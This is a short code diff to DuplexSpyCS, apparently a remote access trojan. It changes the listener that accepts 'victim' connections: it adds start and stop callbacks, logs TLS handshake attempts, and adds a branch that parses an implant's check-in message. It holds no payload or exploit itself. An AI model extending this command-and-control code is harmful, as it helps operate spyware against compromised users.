@@ -52,6 +52,8 @@ namespace DuplexSpyCS
             m_listener.Start();
             m_listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), m_listener);
             m_bIslistening = true;
+
+            fnOnListenerStarted(this);
         }
 
         public override void fnStop()
@@ -77,7 +79,7 @@ namespace DuplexSpyCS
             m_listener.Stop();
             m_bIslistening = false;
 
-            clsStore.sql_conn.WriteSystemLogs($"Stop listening port: {m_nPort}");
+            fnOnListenerStopped(this);
         }
 
         private byte[] fnCombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
@@ -143,6 +145,7 @@ namespace DuplexSpyCS
                 byte[] abStaticRecvBuffer;
                 byte[] abDynamicRecvBuffer = { };
 
+                clsStore.sql_conn.WriteSystemLogs($"{victim.socket.ToString()}: Try to do TLS handshaking...");
                 victim.fnSendCmdParam(1, 0);
 
                 do
@@ -218,6 +221,13 @@ namespace DuplexSpyCS
                                     victim.fnSendCmdParam(2, 1);
                                 });
                             }
+                        }
+                        else if (cmd == 3 && para == 0)
+                        {
+                            string szPlain = Encoding.UTF8.GetString(msg);
+                            List<string> lsMsg = szPlain.Split('|').ToList();
+
+                            fnImplantConnected(this, victim, lsMsg);
                         }
                     }
                 }
